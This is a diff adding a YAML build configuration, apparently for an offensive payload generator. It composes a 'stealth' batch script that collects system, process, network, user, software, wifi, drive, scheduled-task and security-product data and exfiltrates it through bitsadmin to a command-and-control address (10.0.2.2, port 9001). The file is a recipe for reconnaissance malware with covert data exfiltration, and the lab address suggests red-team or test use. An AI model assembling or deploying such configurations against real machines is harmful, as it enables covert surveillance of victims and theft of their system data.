@@ -1,0 +1,21 @@
+name: bat_recon_full_bitsadmin_stealth
+description: Full batch recon with all collectors and HTTP exfil
+format: batch
+core:
+- core/output
+collectors:
+- collectors/sysinfo
+- collectors/processes
+- collectors/network
+- collectors/users
+- collectors/software
+- collectors/wifi
+- collectors/drives
+- collectors/scheduled_tasks
+- collectors/security_products
+exfil: exfil/bitsadmin_lolbin
+arch: arch/sequential
+evasion: []
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
